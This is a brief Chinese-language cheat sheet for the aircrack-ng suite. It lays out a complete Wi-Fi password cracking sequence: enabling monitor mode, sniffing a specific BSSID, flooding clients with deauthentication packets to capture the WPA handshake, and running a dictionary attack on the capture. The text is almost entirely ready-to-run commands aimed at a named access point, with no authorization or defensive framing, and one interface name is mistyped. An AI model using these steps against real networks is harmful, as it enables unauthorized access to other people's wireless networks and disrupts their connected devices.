#### 常用的几个命令

****

```
– Aircrack-ng 无线密码破解
– Aireplay-ng 流量生成和客户端认证
– Airodump-ng 数据包捕获
– Airbase-ng  虚假接入点配置
```

****

aircrack-ng

****



一般的流程 先将影响的进程kll 之后进行监听

airmon-ng start wlan0 开启网卡

airodump-ng wlan0mon 进行数据的嗅探

airodump-ng -c 1 --bssid 28:6C:07:53:53:80  -w ~/Desktop/cap/2.4G wlan0mon 进行数据的监听

```
aireplay-ng -0 0 -a 28:6C:07:53:53:80 wlam0mon 进行洪水攻击 监听到握手包
```

抓到包之后就可以进行跑字典了

```
aircrack-ng -w ~/Desktop/passwd/408.txt ~/Desktop/cap/2.4G-01.cap
```